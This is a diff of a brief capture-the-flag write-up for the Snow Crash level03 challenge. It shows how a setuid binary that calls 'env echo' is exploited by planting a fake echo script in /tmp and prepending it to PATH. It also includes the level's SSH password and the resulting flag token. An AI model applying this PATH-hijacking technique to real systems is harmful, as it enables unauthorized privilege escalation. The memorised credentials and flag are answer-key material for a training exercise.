@@ -1,11 +1,19 @@
-🔻 Analyze
-⬇️ ltrace ./level03
-👉 system("/usr/bin/env echo
++ ---- 🔻 Analyze ----
+|
+|   ltrace ./level03
+|   👉 system("/usr/bin/env echo
+|   which python
+|   👉 /usr/bin/env
+|
 
 
-🔻 Hack
-⬇️ echo -e '#!/usr/bin/env python\nimport os\nos.system("getflag")' > /tmp/echo
-⬇️ chmod +x /tmp/echo
-⬇️ export PATH="/tmp:$PATH"
-⬇️ ./level03
-👉 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
++ ---- 🔻 Hack -------
+|
+|   ssh level03@$SNOW_CRASH_IP -p 4242
+|   └ kooda2puivaav1idi4f57q8iq
+|   echo -e '#!/usr/bin/env python\nimport os\nos.system("getflag")' > /tmp/echo
+|   chmod +x /tmp/echo
+|   export PATH="/tmp:$PATH"
+|   ./level03
+|   👉 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+|
